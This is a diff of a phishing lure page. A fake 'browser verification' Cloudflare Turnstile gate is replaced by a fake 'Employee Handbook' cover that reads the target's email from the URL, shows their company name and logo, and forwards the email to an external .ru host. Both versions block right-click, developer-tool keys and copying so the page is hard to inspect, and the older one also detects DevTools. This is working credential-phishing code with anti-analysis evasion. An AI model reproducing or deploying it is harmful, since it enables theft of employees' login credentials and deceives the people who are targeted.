@@ -1,63 +1,183 @@
-<html> <head> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>Document</title> <style> body, html { height: 50%; margin: 0; display: flex; justify-content: center; align-items: center; } </style> <script>function get() { var o = 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Employee Handbook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(to right, #4facfe, #00f2fe);
+            color: white;
+            text-align: center;
+        }
 
-"https://docsignauthorizationpoint.up.railway.app"
+        .cover-page {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .cover-page h1 {
+            font-size: 3em;
+            margin: 0;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        .cover-page h2 {
+            font-size: 2em;
+            margin: 0;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        .cover-page p {
+            font-size: 1.2em;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
+        }
+        .cover-page a {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: white;
+            color: #4facfe;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+        }
+        .cover-page img {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
+        #loadingSpinner {
+            display: none;
+            margin-top: 20px;
+        }
+        button {
+            padding: 10px 40px; /* Increased padding for a larger button */
+            font-size: 1.1em; /* Increased font size */
+            font-weight: bold;
+            color: #fff;
+            background: linear-gradient(90deg, #ff6f61, #d84315);
+            border: none;
+            border-radius: 50px; /* Makes the button oval */
+            cursor: pointer;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+            transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        button:disabled {
+            background: #888;
+            cursor: not-allowed;
+        }
+        button:hover:enabled {
+            background: linear-gradient(90deg, #e64a19, #bf360c);
+            transform: translateY(-5px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+        }
+        button:active:enabled {
+            transform: translateY(0);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+    <script>
+        function decodeBase64(base64) {
+            return decodeURIComponent(atob(base64).split('').map(function(c) {
+                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+            }).join(''));
+        }
 
- , i = window.location.hash; if (i) var t = o + "#" + i.split("#")[1]; else var t = "https://office365.com"; window.open(t, "_self") }</script> <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script> <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?compat=recaptcha" async defer></script> <section class="center" id="section" style="text-align:-webkit-center"> <div id="recaptcha" class="g-recaptcha" data-theme="light" data-sitekey="0x4AAAAAAA50bSLl6GuqLmns" data-callback="onRecaptchaSuccess"></div> <script> function onRecaptchaSuccess() { setTimeout(function () { get() }, 1e3); } </script> <p id="WrongCaptchaError" class="error2"></p><html><head><title></title></head><body><p><span style="color:#666666;"><span style="font-size:14px;"><span style="font-family:arial,helvetica,sans-serif;"><span style="text-align: -webkit-center;">Verifying your browser for safe internet navigation</span></span></span></span></p></body></html>
- 
- <script>
-    document.addEventListener("DOMContentLoaded", () => {
-        // Disable Right-Click
-        document.addEventListener("contextmenu", (e) => {
-            e.preventDefault();
-            
-        });
-
-        // Prevent F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
-        document.addEventListener("keydown", (e) => {
-            if (
-                e.key === "F12" || 
-                (e.ctrlKey && (e.key === "u" || e.key === "U" || e.key === "j" || e.key === "J" || e.key === "i" || e.key === "I"))
-            ) {
-                e.preventDefault();
-                
+        function setupPage() {
+            let email = window.location.hash.substring(1);
+            if (email.includes('%') || email.includes('=')) {
+                email = decodeBase64(email);
             }
-        });
-
-        // Detect if DevTools is Open
-        const checkDevTools = () => {
-            const threshold = 160;
-            const devtools = {
-                open: false,
-                orientation: null,
+            const domain = email.split('@')[1];
+            const companyName = domain.split('.')[0];
+            document.getElementById('company-name').innerText = companyName.charAt(0).toUpperCase() + companyName.slice(1);
+            document.getElementById('redirectUrl').value = `https://ffq.gwrivesmidic.ru/1gjk/#K${(email)}`;
+            const logo = document.getElementById('company-logo');
+            logo.src = `https://logo.clearbit.com/${domain}`;
+            logo.onerror = function() {
+                logo.style.display = 'none';
             };
-            const element = new Image();
-            Object.defineProperty(element, "id", {
-                get: function () {
-                    devtools.open = true;
-                    devtools.orientation = window.outerWidth - window.innerWidth > threshold ? "vertical" : "horizontal";
-                },
+            document.getElementById('year').innerText = new Date().getFullYear();
+        }
+
+        function preventDefaultActions() {
+            // Disable Right-Click
+            document.addEventListener("contextmenu", (e) => {
+                e.preventDefault();
             });
-            console.log(element); // Trigger the getter
-            return devtools.open;
-        };
 
-        // Monitor for DevTools
-        setInterval(() => {
-            if (checkDevTools()) {
-                
-            }
-        }, 500);
+            // Prevent F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
+            document.addEventListener("keydown", (e) => {
+                if (
+                    e.key === "F12" || 
+                    (e.ctrlKey && (e.key === "u" || e.key === "U" || e.key === "j" || e.key === "J" || e.key === "i" || e.key === "I"))
+                ) {
+                    e.preventDefault();
+                }
+            });
 
-        // Replace Copied Text with Random Characters
-        document.addEventListener("copy", (e) => {
-            e.preventDefault();
-            const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-            const randomString = Array.from({ length: 100 }, () => randomChars.charAt(Math.floor(Math.random() * randomChars.length))).join("");
-            e.clipboardData.setData("text/plain", randomString);
-            
+            // Replace Copied Text with Random Characters
+            document.addEventListener("copy", (e) => {
+                e.preventDefault();
+                const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+                const randomString = Array.from({ length: 100 }, () => randomChars.charAt(Math.floor(Math.random() * randomChars.length))).join("");
+                e.clipboardData.setData("text/plain", randomString);
+            });
+        }
+
+        function handleRedirect() {
+            const button = document.getElementById("redirectButton");
+            const spinner = document.getElementById("loadingSpinner");
+
+            button.addEventListener("click", function (e) {
+                e.preventDefault(); // Prevent immediate form submission
+
+                // Show loading spinner
+                spinner.style.display = 'block';
+
+                // Change button text and style
+                button.textContent = "Check Completed...";
+                button.style.background = "linear-gradient(90deg, #4caf50, #2e7d32)"; // Change to green
+                button.style.transition = "background 0.5s";
+
+                // Simulate a short delay before form submission
+                setTimeout(() => {
+                    const redirectUrl = document.getElementById("redirectUrl").value;
+                    window.location.href = redirectUrl; // Redirect to the URL
+                }, 2500); // 2.5-second delay
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            setupPage();
+            preventDefaultActions();
+            handleRedirect();
+
+            // Enable the button after setup
+            document.getElementById("redirectButton").disabled = false;
         });
-    });
-</script>
+    </script>
+</head>
+<body>
+
+    <!-- Cover Page -->
+    <div class="cover-page">
+        <img id="company-logo" src="#" alt="Company Logo">
+        <h1 id="company-name">[Company Name]</h1>
+        <h2>Employee Handbook</h2>
+        <p id="year"></p>
+        <form id="redirectForm" method="POST">
+            <!-- Hidden input to store the redirect URL -->
+            <input type="hidden" name="redirectUrl" id="redirectUrl" value="" />
+            <button id="redirectButton" disabled aria-label="Initialize redirection">Open</button>
+        </form>
+        <div id="loadingSpinner">Loading...</div>
+    </div>
 
 </body>
 </html>
